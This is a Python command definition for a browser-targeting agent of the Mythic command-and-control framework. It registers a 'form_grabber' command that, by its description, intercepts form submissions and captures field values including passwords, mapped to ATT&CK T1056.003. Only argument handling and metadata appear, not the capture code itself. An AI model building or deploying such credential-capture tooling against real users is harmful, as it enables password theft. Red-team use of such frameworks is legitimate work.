from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class FormGrabberArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value=120,
                description="Capture duration in seconds (default 120)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class FormGrabberCommand(CommandBase):
    cmd = "form_grabber"
    needs_admin = False
    help_cmd = "form_grabber"
    description = "Intercept all form submissions for a specified duration. Captures form action, method, and all field values including passwords."
    version = 1
    author = "@grampae"
    attackmapping = ["T1056.003"]
    argument_class = FormGrabberArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        duration = task.args.get_arg("duration") or 120
        task.display_params = "{}s".format(duration)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
